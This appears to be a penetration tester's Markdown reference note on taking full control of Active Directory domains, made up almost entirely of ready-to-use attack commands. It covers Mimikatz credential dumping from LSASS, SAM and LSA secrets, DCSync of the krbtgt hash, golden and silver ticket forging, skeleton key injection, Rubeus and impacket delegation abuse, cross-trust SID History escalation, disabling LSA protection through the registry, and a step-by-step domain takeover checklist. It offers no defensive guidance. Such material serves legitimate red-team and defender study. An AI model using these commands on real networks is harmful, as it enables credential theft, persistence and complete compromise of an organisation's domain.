# Active Directory Domain Dominance

## Overview

Techniques for asserting full control over the Active Directory domain. Most require elevated (DA-equivalent) privileges on a Domain Controller.

---

## Mimikatz Full Reference

Mimikatz is the Swiss Army knife for Windows credential theft and AD dominance.

### Privilege Check

```powershell
mimikatz # privilege::debug
# -> "20" = OK (SeDebugPrivilege enabled)
# -> If failed, run as Administrator or use a different technique
```

### Credential Extraction

```powershell
# Extract from LSASS (in-memory credentials)
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::logonpasswords full

# Extract with extra details
mimikatz # sekurlsa::wdigest
mimikatz # sekurlsa::kerberos
mimikatz # sekurlsa::tspkg
mimikatz # sekurlsa::credman
mimikatz # sekurlsa::minidump <lsass.dmp>

# List all authentication packages
mimikatz # sekurlsa::list
```

### SAM and SYSTEM

```powershell
# Local SAM dump (requires local admin)
mimikatz # lsadump::sam

# With SYSTEM hive
mimikatz # lsadump::sam /sam:C:\path\SAM /system:C:\path\SYSTEM

# Domain SAM
mimikatz # lsadump::lsa /patch
mimikatz # lsadump::lsa /inject
mimikatz # lsadump::lsa /inject /name:krbtgt
mimikatz # lsadump::lsa /inject /name:Administrator

# Trust secrets
mimikatz # lsadump::trust
mimikatz # lsadump::domain /export
```

### DCSync

```powershell
# Sync krbtgt hash
mimikatz # lsadump::dcsync /domain:<domain> /user:krbtgt

# Sync specific user
mimikatz # lsadump::dcsync /domain:<domain> /user:Administrator

# All users
mimikatz # lsadump::dcsync /domain:<domain> /all

# Export with output
mimikatz # lsadump::dcsync /domain:<domain> /user:krbtgt /csv
```

### Golden Ticket

```powershell
# Create golden ticket and inject into session
mimikatz # kerberos::golden /user:Administrator /domain:<domain> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NT_HASH> /ptt

# Golden ticket with specific groups
mimikatz # kerberos::golden /user:Administrator /domain:<domain> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NT_HASH> /groups:500,501,502,512,513,518,519 /ptt

# Golden ticket with AES keys
mimikatz # kerberos::golden /user:Administrator /domain:<domain> /sid:<DOMAIN_SID> /aes256:<AES_KEY> /ptt

# Save ticket to file (no /ptt)
mimikatz # kerberos::golden /user:Administrator /domain:<domain> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NT_HASH> /ticket:ticket.kirbi

# Golden ticket with SID History
mimikatz # kerberos::golden /user:Administrator /domain:<domain> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NT_HASH> /sids:<EXTRA_SID> /ptt

# Check ticket
klist
```

### Silver Ticket

```powershell
# Create silver ticket for CIFS
mimikatz # kerberos::golden /user:Administrator /domain:<domain> /sid:<DOMAIN_SID> /target:<target> /service:CIFS /rc4:<SERVICE_HASH> /ptt

# Verify
dir \\<target>\C$
```

### Skeleton Key

```powershell
# Inject skeleton key into DC LSASS (patch all domain auth)
mimikatz # privilege::debug
mimikatz # misc::skeleton

# Skeleton key password: mimikatz
# Access any machine as any user with password "mimikatz"
net use \\<DC>\C$ /user:<domain>\Administrator mimikatz

# Skeleton key on Server 2012+ with LSASS protected process
# Need to disable LSA Protection first
```

### Kerberos Ticket Operations

```powershell
# Extract tickets
mimikatz # sekurlsa::tickets
mimikatz # sekurlsa::tickets /export

# Inject ticket
mimikatz # kerberos::ptt ticket.kirbi

# Purge tickets
mimikatz # kerberos::purge

# List tickets
mimikatz # kerberos::list

# Cache operations
mimikatz # kerberos::cache
```

### DPAPI

```powershell
# Master key
mimikatz # dpapi::masterkey

# Protected data
mimikatz # dpapi::blob /in:<file> /unprotect

# Credential manager
mimikatz # dpapi::cred /in:<credential_file>
```

### Vault / Credential Manager

```powershell
# List Windows Vault credentials
mimikatz # vault::list

# Extract
mimikatz # vault::cred /patch
```

### Crypto / Certificates

```powershell
# List certificates
mimikatz # crypto::certificates
mimikatz # crypto::certificates /export

# Extract keys
mimikatz # crypto::sc
mimikatz # crypto::capi
```

---

## SID History Injection

Add SID of privileged domain group to a user's SIDHistory attribute for escalation across trusts.

```powershell
# Mimikatz SID injection
mimikatz # kerberos::golden /user:Administrator /domain:<current_domain> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /sids:<ENTERPRISE_ADMINS_SID> /ptt

# Check current SIDs
whoami /user
whoami /groups
```

### Cross-Domain SID History (Forest Trust)

```powershell
# Enterprise Admins SID for resource forest
mimikatz # kerberos::golden /user:Administrator /domain:child.domain.local /sid:CHILD_DOMAIN_SID /krbtgt:KRBTGT_HASH /sids:PARENT_DOMAIN_SID-519 /ptt
```

### PowerView SID History

```powershell
# Check who has SIDHistory
Get-DomainUser -Properties samaccountname,sidhistory | ? {$_.sidhistory -ne $null}
```

---

## Kerberos Delegation Attacks

### Unconstrained Delegation

Any service with unconstrained delegation can impersonate any user connecting to it.

#### Find Delegation Targets

```powershell
# PowerView
Get-NetComputer -Unconstrained

# ADModule
Get-ADComputer -Filter {userAccountControl -band 524288}
```

#### Exploit

```powershell
# On unconstrained server, when a DA connects:
mimikatz # sekurlsa::tickets /export

# Or use Rubeus to monitor for tickets
Rubeus.exe monitor /interval:10

# Capture TGT and inject
Rubeus.exe ptt /ticket:<base64_ticket>
```

### Constrained Delegation

Delegation limited to specific services.

```powershell
# Find constrained delegation
Get-NetComputer -TrustedToAuth
Get-DomainUser -TrustedToAuth

# Exploit with Kekeo or Rubeus
Rubeus.exe s4u /user:<service_account> /rc4:<NTLM_HASH> /impersonateuser:Administrator /msdsspn:<SPN>

# Access target service
Rubeus.exe s4u /user:<svc> /rc4:<hash> /impersonateuser:Administrator /msdsspn:<SPN> /ptt
```

### Resource-Based Constrained Delegation (RBCD)

Control which principals can delegate to a computer. If you have `GenericWrite` on a computer, you can configure RBCD.

```powershell
# Using PowerView (old approach)
Set-DomainRBCD -Identity <target_computer> -DelegateFrom <controlled_computer>

# Using ActiveDirectory module
Set-ADComputer <target_computer> -PrincipalsAllowedToDelegateToAccount <controlled_computer>

# Using Rubeus
Rubeus.exe s4u /user:<controlled_computer>$ /rc4:<NTLM_HASH> /impersonateuser:Administrator /msdsspn:<TARGET_SERVICE> /ptt

# Using impacket on Linux
impacket-rbcd -action write -delegate-from <controlled_computer>$ -delegate-to <target_computer>$ <domain>/<user>:<password>
```

---

## Trust Attacks

### Domain Trust Enumeration

```powershell
# PowerView
Get-NetDomainTrust
Get-NetDomainTrust -Domain <domain>
Get-NetForestTrust
Get-NetForestTrust -Forest <forest>

# ADModule
Get-ADTrust -Filter *
Get-ADTrust -Identity <target_domain>
```

### Trust Key Extraction

```powershell
# LSA secrets (trust passwords)
mimikatz # lsadump::trust /patch

# On DC with DA
mimikatz # lsadump::dcsync /domain:<domain> /user:<target_domain>$
mimikatz # lsadump::domain /export
```

### Child-to-Parent Exploitation (ExtraSids)

```powershell
# Get krbtgt hash of child domain
mimikatz # lsadump::dcsync /domain:child.domain.local /user:krbtgt

# Create golden ticket with Enterprise Admins SID
mimikatz # kerberos::golden /user:Administrator /domain:child.domain.local /sid:CHILD_SID /sids:PARENT_SID-519 /krbtgt:KRBTGT_HASH /ptt

# Access parent DC
dir \\parent-dc.domain.local\C$
```

### Inter-Realm Trust

```bash
# Using impacket
impacket-ticketer -nthash <trust_key_hash> -domain-sid <DOMAIN_SID> -domain <domain> -extra-sid <TARGET_DOMAIN_SID> Administrator

# Use to access resources in target domain
KRB5CCNAME=ticket.ccache impacket-smbexec <domain>/Administrator@<target> -k -no-pass
```

---

## LSA Protection Bypass

```powershell
# Check if LSA is running as protected process
# Run as SYSTEM, not Administrator

# Option 1: Disable LSA protection via registry (requires reboot)
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f

# Option 2: Use Mimikatz driver
mimikatz # !+
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

---

## Full Domain Dominance Checklist

```powershell
# Step-by-step
1.  privilege::debug
2.  lsadump::sam                  # Local SAM
3.  lsadump::lsa /inject /name:krbtgt    # KRBTGT hash
4.  lsadump::lsa /inject /name:<user>    # Specific hash
5.  lsadump::dcsync /domain:<domain> /user:krbtgt
6.  lsadump::dcsync /domain:<domain> /user:Administrator
7.  sekurlsa::logonpasswords      # All cached creds
8.  sekurlsa::tickets /export     # All tickets
9.  sekurlsa::wdigest             # WDigest creds (if enabled)
10. lsadump::trust               # Trust information
11. vault::list                  # Credential Manager
12. crypto::certificates         # Certificate store
13. kerberos::golden ... /ptt    # Golden ticket
```

---

## Related Notes

- [[AD Recon Enumeration]]
- [[AD Attack Vectors]]
- [[AD Lateral Movement]]
- [[AD ACL Abuse]]
- [[Windows Post Exploitation]]
